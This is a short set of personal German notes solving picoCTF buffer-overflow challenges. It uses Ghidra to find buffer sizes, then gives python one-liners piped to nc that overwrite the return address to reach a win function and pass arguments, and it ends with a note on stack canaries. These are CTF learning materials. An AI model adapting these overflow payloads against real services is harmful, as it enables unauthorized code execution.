# 2
ghidra bin öffnen
Buffer größe anschauen
![[Pasted image 20260128102330.png]]
local_70 ist 0x70 -> 112

```
python -c "import sys; sys.stdout.buffer.write(b'B'*112 + b'\n')" | nc saturn.picoctf.net 61566
```

![[Pasted image 20260128102747.png]]
als nächstes die return addresse ändern.

von der win func
![[Pasted image 20260128103034.png]]
Aber um drehen wegen little endian

![[Pasted image 20260128103258.png]]
auf parms drücken -> liest von Stack 0x4 und 0x8

```
python -c "import sys; sys.stdout.buffer.write(b'B'*112 + b'\x96\x92\x04\x08' + b'B'*4 + b'\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0' + b'\n')" | nc saturn.picoctf.net 56714
```

# 3
```
python -c "import sys; sys.stdout.buffer.write(b'88' + b'\n' + b'B'*84 + b'\x36\x93\x04\x08' + b'\n')" | nc saturn.picoctf.net 54061
```

geht nicht wegen stack smashing (geheimer wert der vor dem return überprüft wird)

Stack cannaries, man muss den zufälligen wert lesen oder hoffen, dass der wert nicht zufällig ist